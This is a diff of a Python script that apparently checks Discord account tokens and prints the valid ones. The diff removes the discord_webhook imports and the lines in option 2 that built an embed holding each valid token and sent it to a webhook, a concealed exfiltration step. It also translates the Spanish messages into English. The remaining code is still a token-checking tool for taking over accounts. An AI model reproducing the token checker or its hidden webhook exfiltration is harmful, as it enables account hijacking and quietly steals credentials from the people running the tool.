@@ -5,10 +5,8 @@
 import random
 import string
 import pathlib
-import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path, tkinter
+import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path
 import colorama
-import discord_webhook
-from discord_webhook import DiscordWebhook, DiscordEmbed
 from colorama import Fore, init, Back, Style
 from datetime import date
 
@@ -81,13 +79,11 @@ if opcion=='2':
 
 	        try:
 	            if src.status_code == 200:
-	                print(f'{Fore.LIGHTGREEN_EX}Token Valido! >{Fore.RESET} ' + token)
-	                embed = DiscordEmbed(title='Nuevo Token Funcional', description='Proximamente aca ira el token!'+ token, color=242424)
-	                response = webhook.execute()
+	                print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
 	            else:
-	                print(f'{Fore.RED}Token Invalido >{Fore.RESET} ' + token)
+	                print(f'{Fore.RED}Invalid token >{Fore.RESET} ' + token)
 	        except Exception:
-	            print(f"{Fore.CYAN}Ocurrio un error inesperado, Contactate con Matty#8952 {Fore.RESET}")
+	            print(f"{Fore.CYAN}Error, please contact with Matty#8952 {Fore.RESET}")
 pass
 if opcion=='3':
 	os.system("cls")
